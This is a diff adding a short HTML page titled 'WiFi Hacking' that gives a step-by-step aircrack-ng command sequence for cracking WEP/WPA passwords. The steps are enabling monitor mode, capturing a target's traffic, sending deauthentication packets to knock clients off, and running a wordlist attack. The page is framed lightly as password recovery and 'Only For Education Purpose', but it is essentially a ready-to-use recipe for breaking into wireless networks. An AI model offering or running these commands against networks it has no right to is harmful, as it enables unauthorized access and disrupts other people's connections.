@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>WiFi Hacking</title>
+  <link href="img/wifi.png" rel="icon">
+  <meta content="" name="descriptison">
+  <meta content="" name="keywords">
+
+ 
+
+ 
+  <!-- Vendor CSS Files -->
+  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+  <!-- Template Main CSS File -->
+  <link href="assets/css/style.css" rel="stylesheet">
+
+
+
+<body>
+
+  <!-- =======  WiFi ======= -->
+  <section id="WiFi" class="WiFi">
+    <div class="container">
+
+      <div class="section-title">
+        <h2>WiFi Hacking</h2>
+      </div>
+
+      <div class="row">
+        <div class="col-lg-6">
+          <h3 class="WiFi-title">What We Need?</h3>
+          <div class="WiFi-item pb-0">
+            <h4>1. Kali Linux Or Other</h4> 
+            <h4 WiFi-item pb-0>2. Basic Knowledge About Linux</h4>
+
+            <p><em>Cracking Or Hacking Wireless Networks, We’re Basically Talking About Cracking WEP/WPA Keys. If You Forgot Your Wi-Fi Password, You Could Either Reset Your Router Or Crack Your Wireless Network.</em></p>
+            <p>
+            <ul>
+              <span style="color: red;">🔹 Command To Hack Wifi Password🔹</span>
+              <li>First Open Terminal</li>
+              <span style="color: red">🔹iwconfig</span><br/>
+              <span style="color: red;">🔹airmon-ng check kill</span><br/>
+              <span style="color: red;">🔹airmon-ng start wlan0</span><br/>
+              <span style="color: red;">🔹airodump-ng wlan0mon</span><br/>
+              <span style="color: red;">🔹airodump-ng -c channel –bssid [bssid of wifi] -w [path to write the data of packets] wlan0mon[interface].</span><br/>
+              <span style="color: red;">🔹aireplay-ng –deauth 10 -a [router bssid] interface</span><br/>
+              <span style="color: red;">🔹aircrack-ng -b [bssid of router] -w [path to word list] [path to capture packets]</span>
+            </ul>
+            </p>
+          </div>
+        </div>
+       
+      </div>
+    </div>
+    </section><!-- End WiFi -->
+    <footer style="text-align: center;color: red;text-shadow: 3px 3px 5px black;font-weight: bold;">
+  <spa>"That's It"<br>
+This Is Only For Education Purpose...!!</span>
+</footer>
+
+</body>
+
+</html>
